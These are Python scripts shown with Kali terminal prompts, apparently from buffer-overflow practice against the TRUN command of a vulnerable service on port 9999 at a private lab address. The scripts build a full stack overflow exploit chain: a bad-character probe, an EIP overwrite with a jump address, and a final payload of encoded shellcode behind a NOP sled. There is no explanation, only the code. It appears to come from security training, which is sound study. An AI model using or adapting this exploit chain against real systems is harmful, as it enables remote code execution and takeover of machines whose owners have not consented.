#!/usr/bin/python3

import sys,socket
from time import sleep
badchars = (
  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  b"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  b"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  b"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  b"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  b"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  b"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  b"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  b"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  b"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  b"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
buffer=b"A" * 2002 + b"B"*4 + badchars

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.7',9999))
s.send((b'TRUN /.:/ ' + buffer))
s.close()
s.close()

┌──(kali㉿kali)-[~/buffer_overflow/old_bf/practice]
└─$ cat execution-flow.py
#!/usr/bin/python3

import sys,socket
from time import sleep

buffer=b"A" * 2002 + b"\xAF\x11\x50\x62" + b"C" *(3000-2002-4)

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.7',9999))
s.send((b'TRUN /.:/ ' + buffer))
s.close()
s.close()

┌──(kali㉿kali)-[~/buffer_overflow/old_bf/practice]
└─$ cat final.py
#!/usr/bin/python3

import sys,socket
from time import sleep


buf =  b""
buf += b"\xbd\x4d\xec\x2f\xcb\xdb\xc8\xd9\x74\x24\xf4\x58"
buf += b"\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x0e\x03\x25"
buf += b"\xe2\xcd\x3e\x49\x12\x93\xc1\xb1\xe3\xf4\x48\x54"
buf += b"\xd2\x34\x2e\x1d\x45\x85\x24\x73\x6a\x6e\x68\x67"
buf += b"\xf9\x02\xa5\x88\x4a\xa8\x93\xa7\x4b\x81\xe0\xa6"
buf += b"\xcf\xd8\x34\x08\xf1\x12\x49\x49\x36\x4e\xa0\x1b"
buf += b"\xef\x04\x17\x8b\x84\x51\xa4\x20\xd6\x74\xac\xd5"
buf += b"\xaf\x77\x9d\x48\xbb\x21\x3d\x6b\x68\x5a\x74\x73"
buf += b"\x6d\x67\xce\x08\x45\x13\xd1\xd8\x97\xdc\x7e\x25"
buf += b"\x18\x2f\x7e\x62\x9f\xd0\xf5\x9a\xe3\x6d\x0e\x59"
buf += b"\x99\xa9\x9b\x79\x39\x39\x3b\xa5\xbb\xee\xda\x2e"
buf += b"\xb7\x5b\xa8\x68\xd4\x5a\x7d\x03\xe0\xd7\x80\xc3"
buf += b"\x60\xa3\xa6\xc7\x29\x77\xc6\x5e\x94\xd6\xf7\x80"
buf += b"\x77\x86\x5d\xcb\x9a\xd3\xef\x96\xf2\x10\xc2\x28"
buf += b"\x03\x3f\x55\x5b\x31\xe0\xcd\xf3\x79\x69\xc8\x04"
buf += b"\x7d\x40\xac\x9a\x80\x6b\xcd\xb3\x46\x3f\x9d\xab"
buf += b"\x6f\x40\x76\x2b\x8f\x95\xd9\x7b\x3f\x46\x9a\x2b"
buf += b"\xff\x36\x72\x21\xf0\x69\x62\x4a\xda\x01\x09\xb1"
buf += b"\x8d\xed\x66\xb8\x4b\x86\x74\xba\x42\x0a\xf0\x5c"
buf += b"\x0e\xa2\x54\xf7\xa7\x5b\xfd\x83\x56\xa3\x2b\xee"
buf += b"\x59\x2f\xd8\x0f\x17\xd8\x95\x03\xc0\x28\xe0\x79"
buf += b"\x47\x36\xde\x15\x0b\xa5\x85\xe5\x42\xd6\x11\xb2"
buf += b"\x03\x28\x68\x56\xbe\x13\xc2\x44\x43\xc5\x2d\xcc"
buf += b"\x98\x36\xb3\xcd\x6d\x02\x97\xdd\xab\x8b\x93\x89"
buf += b"\x63\xda\x4d\x67\xc2\xb4\x3f\xd1\x9c\x6b\x96\xb5"
buf += b"\x59\x40\x29\xc3\x65\x8d\xdf\x2b\xd7\x78\xa6\x54"
buf += b"\xd8\xec\x2e\x2d\x04\x8d\xd1\xe4\x8c\xad\x33\x2c"
buf += b"\xf9\x45\xea\xa5\x40\x08\x0d\x10\x86\x35\x8e\x90"
buf += b"\x77\xc2\x8e\xd1\x72\x8e\x08\x0a\x0f\x9f\xfc\x2c"
buf += b"\xbc\xa0\xd4"

shellcode=buf
buffer=b"A" * 2002 + b"\xAF\x11\x50\x62" + b"\x90" * 16 + shellcode

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('192.168.1.7',9999))
s.send((b'TRUN /.:/ ' + buffer))
s.close()
s.close()
